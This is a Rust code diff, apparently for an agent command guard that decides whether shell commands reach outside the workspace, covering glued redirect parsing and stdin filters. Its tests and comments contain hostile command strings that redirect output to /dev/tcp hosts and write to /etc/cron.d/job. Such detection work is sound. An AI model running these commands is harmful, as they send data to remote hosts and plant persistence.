@@ -81,6 +81,16 @@ pub(super) fn reaches_outside(
     if redirect_targets(&segment.text).any(|target| outside(target, name, workspace)) {
         return true;
     }
+    // A proven stdin-only filter is handed the previous step's output, so its
+    // operands are patterns and counts rather than paths. Reading one as a
+    // path put `ls -R . | grep -v .git` outside the workspace. The same word
+    // has to be inert for that to hold: an environment prefix, a wrapper or
+    // shell syntax inside a word can still name a file this would then skip.
+    if crate::pretool::segment_proof::stdin_filter_segment(segment)
+        && crate::pretool::filter_pattern_text::maskable_filter_segment(segment)
+    {
+        return false;
+    }
     segment.arguments.iter().any(|argument| {
         if granted_script == Some(argument.as_str()) || (guide && argument == SAFETY_GUIDE) {
             return false;
@@ -318,23 +328,31 @@ fn expands_variable(text: &str, name: &str) -> bool {
 }
 
 /// Redirect targets live only in the segment text: `> out`, `2>>log`, `&>x`.
+///
+/// A redirect glued to an operand, as in `out/>/dev/tcp/host/443`, still
+/// opens its target, and one word can carry several: `b>x>/etc/cron.d/job`
+/// opens `x` and then `/etc/cron.d/job`. Each target ends at the next operator.
 pub(super) fn redirect_targets(text: &str) -> impl Iterator<Item = &str> {
-    let mut words = text.split_whitespace().peekable();
-    std::iter::from_fn(move || {
-        while let Some(word) = words.next() {
-            let operator = word.trim_start_matches(|c: char| c.is_ascii_digit() || c == '&');
-            if !operator.starts_with(['>', '<']) {
-                continue;
-            }
-            let target = operator.trim_start_matches(['>', '<', '|', '&']);
-            let target = if target.is_empty() {
-                words.next().unwrap_or_default()
-            } else {
-                target
-            };
-            return Some(target.trim_matches(['"', '\'']));
+    let mut words = text.split_whitespace();
+    let mut rest = "";
+    std::iter::from_fn(move || loop {
+        if rest.is_empty() {
+            rest = words.next()?;
         }
-        None
+        let Some(at) = rest.find(['>', '<']) else {
+            rest = "";
+            continue;
+        };
+        let after = rest[at..].trim_start_matches(['>', '<', '|', '&']);
+        // An operator that ends the word takes the next word as its target.
+        let word = if after.is_empty() {
+            words.next().unwrap_or_default()
+        } else {
+            after
+        };
+        let (target, tail) = word.split_at(word.find(['>', '<']).unwrap_or(word.len()));
+        rest = tail;
+        return Some(target.trim_matches(['"', '\'']));
     })
 }
 
@@ -380,3 +398,31 @@ pub(super) fn outside(value: &str, name: &str, workspace: &Path) -> bool {
 #[cfg(test)]
 #[path = "workspace_contained_identity_tests.rs"]
 mod identity_tests;
+
+#[cfg(test)]
+mod redirect_target_tests {
+    use super::redirect_targets;
+
+    fn targets(text: &str) -> Vec<&str> {
+        redirect_targets(text).collect()
+    }
+
+    #[test]
+    fn every_glued_redirect_names_its_own_target() {
+        assert_eq!(
+            targets("cp a b>x>/etc/cron.d/job"),
+            ["x", "/etc/cron.d/job"]
+        );
+        assert_eq!(
+            targets("rsync -a src/ dist/>log>/dev/tcp/host/443"),
+            ["log", "/dev/tcp/host/443"]
+        );
+        assert_eq!(
+            targets("rsync -a src/ fresh/>/dev/tcp/example.com/443"),
+            ["/dev/tcp/example.com/443"]
+        );
+        assert_eq!(targets("echo hi > out 2>&1"), ["out", "1"]);
+        assert_eq!(targets("sort <in >>'log'"), ["in", "log"]);
+        assert!(targets("cargo build --release").is_empty());
+    }
+}
